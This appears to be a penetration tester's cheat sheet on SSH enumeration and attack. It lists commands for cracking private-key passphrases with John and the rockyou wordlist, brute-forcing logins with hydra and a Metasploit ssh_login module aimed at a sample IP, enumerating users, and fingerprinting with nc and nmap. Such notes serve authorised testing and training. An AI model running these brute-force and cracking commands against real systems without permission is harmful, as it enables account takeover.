# SSH Enumeration



```
#Login
ssh uname@IP #enter password in the prompt

#id_rsa or id_ecdsa file
chmod 600 id_rsa/id_ecdsa
ssh uname@IP -i id_rsa/id_ecdsa #if it still asks for password, crack them using John

#cracking id_rsa or id_ecdsa
ssh2john id_ecdsa(or)id_rsa > hash
john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash

#bruteforce
hydra -l uname -P passwords.txt <IP> ssh #'-L' for usernames list, '-l' for username and viceversa

#check for vulnerabilities associated with the version identified.
```

















auxiliary/scanner/ssh/ssh_versionI
auxiliary/scanner/ssh/ssh_login # brute force
auxiliary/scanner/ssh/ssh_enumusers # super useful!

```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.245.211.3
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit
```


### Get ssh banner with `nc`
`nc [IP] 22`
`nc -nv [IP] 22`


### Nmap
```
# Enumerate algorithms
nmap [IP] -p22 --script ssh2-enum-algos

# SSH Keys
nmap [IP] -p22 --script ssh-hostkey --script-args ssh_hostkey=full


nmap [IP] -p22 --script ssh-auth-methods --script-args="ssh.user=[USERNAME]"

```



